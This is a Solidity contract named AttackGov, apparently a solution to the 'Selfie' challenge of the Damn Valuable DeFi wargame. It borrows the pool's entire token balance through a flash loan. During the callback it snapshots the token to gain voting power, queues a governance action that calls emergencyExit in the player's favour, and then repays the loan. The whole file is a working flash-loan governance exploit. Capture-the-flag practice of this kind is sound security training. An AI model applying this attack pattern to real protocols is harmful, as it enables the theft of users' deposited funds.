// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract AttackGov is IERC3156FlashBorrower {
    address immutable player;
    SelfiePool immutable pool;
    SimpleGovernance immutable governance;
    DamnValuableTokenSnapshot immutable token;
    uint256 constant AMOUNT = 1_500_000 ether;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token) {
        player = msg.sender;
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function flashLoanQueue() external {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), bal, "0x00");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        token.snapshot();

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(pool), 0, data);

        uint256 bal = token.balanceOf(address(this));
        token.approve(address(pool), bal);
        return CALLBACK_SUCCESS;
    }
}
